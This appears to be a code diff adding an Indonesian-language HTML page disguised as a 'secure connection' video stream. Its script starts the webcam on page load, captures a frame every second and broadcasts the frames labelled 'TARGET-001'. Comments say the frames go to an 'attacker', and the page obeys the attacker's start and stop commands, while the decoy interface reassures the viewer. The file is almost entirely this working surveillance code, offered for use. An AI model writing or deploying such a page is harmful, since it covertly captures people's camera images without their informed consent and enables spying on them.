@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Streaming</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #0a0a0a; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+        .container {
+            background: #1a1a1a;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 0 50px rgba(0,255,0,0.1);
+            text-align: center;
+            border: 1px solid #333;
+            max-width: 500px;
+            width: 90%;
+        }
+        #videoFeed {
+            width: 100%;
+            border-radius: 12px;
+            background: #000;
+            border: 2px solid #2a2a2a;
+            display: none;
+        }
+        .status {
+            color: #00ff88;
+            font-size: 14px;
+            margin-top: 15px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            opacity: 0.7;
+        }
+        .dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: #00ff88;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 0.3; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1.2); }
+            100% { opacity: 0.3; transform: scale(0.8); }
+        }
+        .watermark {
+            position: fixed;
+            bottom: 10px;
+            right: 15px;
+            color: #333;
+            font-size: 11px;
+            letter-spacing: 1px;
+        }
+        #fakeUI {
+            color: #555;
+            font-size: 13px;
+            margin-top: 10px;
+            padding: 8px;
+            background: #111;
+            border-radius: 8px;
+            border: 1px solid #222;
+        }
+        .green-light { color: #00ff88; }
+        #debugInfo {
+            color: #666;
+            font-size: 11px;
+            margin-top: 10px;
+            font-family: monospace;
+        }
+        #statusText {
+            color: #00ff88;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2 style="color:#fff; font-weight:300; letter-spacing:3px; margin-bottom:15px;">● STREAM</h2>
+        <video id="videoFeed" autoplay playsinline muted></video>
+        <div id="fakeUI">
+            <span class="green-light">⚡</span> Koneksi aman • <span class="green-light">●</span> <span id="statusText">Menunggu...</span>
+        </div>
+        <div class="status">
+            <span class="dot"></span> SISTEM SIAP
+        </div>
+        <div id="debugInfo">📡 Channel: <span id="channelStatus">Belum terhubung</span></div>
+    </div>
+    <div class="watermark">v.2.5.0</div>
+
+    <script>
+        (function() {
+            const video = document.getElementById('videoFeed');
+            const statusText = document.getElementById('statusText');
+            const channelStatus = document.getElementById('channelStatus');
+            let stream = null;
+            let sendInterval = null;
+            let frameCounter = 0;
+
+            // === BUAT BROADCAST CHANNEL ===
+            const channel = new BroadcastChannel('haz_camera_channel');
+            
+            // Kirim sinyal bahwa target online
+            channel.postMessage({ 
+                type: 'target_online', 
+                targetId: 'TARGET-001',
+                timestamp: Date.now()
+            });
+            channelStatus.textContent = 'Terhubung ✅';
+            channelStatus.style.color = '#00ff88';
+
+            // === MULAI KAMERA ===
+            function startCamera() {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    statusText.textContent = '❌ Tidak support';
+                    return;
+                }
+
+                navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        facingMode: 'user'
+                    }, 
+                    audio: false 
+                })
+                .then(function(mediaStream) {
+                    stream = mediaStream;
+                    video.srcObject = mediaStream;
+                    video.style.display = 'block';
+                    statusText.textContent = '● Streaming';
+                    statusText.style.color = '#00ff88';
+                    
+                    // Mulai kirim frame
+                    startSendingFrames(mediaStream);
+                })
+                .catch(function(err) {
+                    console.error('Kamera error:', err);
+                    statusText.textContent = '⚠️ Izin ditolak';
+                    statusText.style.color = '#ff4444';
+                });
+            }
+
+            // === KIRIM FRAME KE ATTACKER ===
+            function startSendingFrames(mediaStream) {
+                const videoTrack = mediaStream.getVideoTracks()[0];
+                if (!videoTrack) {
+                    statusText.textContent = '❌ No video track';
+                    return;
+                }
+
+                // Gunakan canvas sebagai fallback jika ImageCapture tidak support
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                
+                // Ukuran frame (kecilkan untuk performa)
+                const W = 320;
+                const H = 240;
+                canvas.width = W;
+                canvas.height = H;
+
+                // Kirim frame setiap 1 detik (lebih stabil)
+                sendInterval = setInterval(() => {
+                    // Ambil frame dari video
+                    ctx.drawImage(video, 0, 0, W, H);
+                    
+                    // Konversi ke base64 (kualitas rendah untuk ukuran kecil)
+                    try {
+                        const base64 = canvas.toDataURL('image/jpeg', 0.5);
+                        
+                        // Kirim via BroadcastChannel
+                        channel.postMessage({
+                            type: 'frame',
+                            image: base64,
+                            timestamp: Date.now(),
+                            targetId: 'TARGET-001',
+                            frameId: ++frameCounter
+                        });
+                        
+                        // Update status
+                        if (frameCounter % 10 === 0) {
+                            channelStatus.textContent = `📤 ${frameCounter} frames sent`;
+                        }
+                    } catch (e) {
+                        // Silent fail
+                    }
+                }, 1000); // 1 frame per detik (lebih stabil)
+            }
+
+            // === RESPON PERINTAH DARI ATTACKER ===
+            channel.onmessage = function(event) {
+                const data = event.data;
+                if (data.type === 'stop_stream') {
+                    if (sendInterval) {
+                        clearInterval(sendInterval);
+                        sendInterval = null;
+                        statusText.textContent = '⏸️ Dihentikan';
+                    }
+                }
+                if (data.type === 'request_stream') {
+                    statusText.textContent = '📡 Diminta oleh attacker';
+                    if (!stream) {
+                        startCamera();
+                    }
+                }
+                if (data.type === 'attacker_online') {
+                    channelStatus.textContent = 'Attacker online ✅';
+                }
+            };
+
+            // === MULAI ===
+            window.addEventListener('load', function() {
+                setTimeout(startCamera, 500);
+            });
+
+            // === CLEANUP ===
+            window.addEventListener('beforeunload', function() {
+                if (sendInterval) clearInterval(sendInterval);
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            });
+
+        })();
+    </script>
+</body>
+</html>
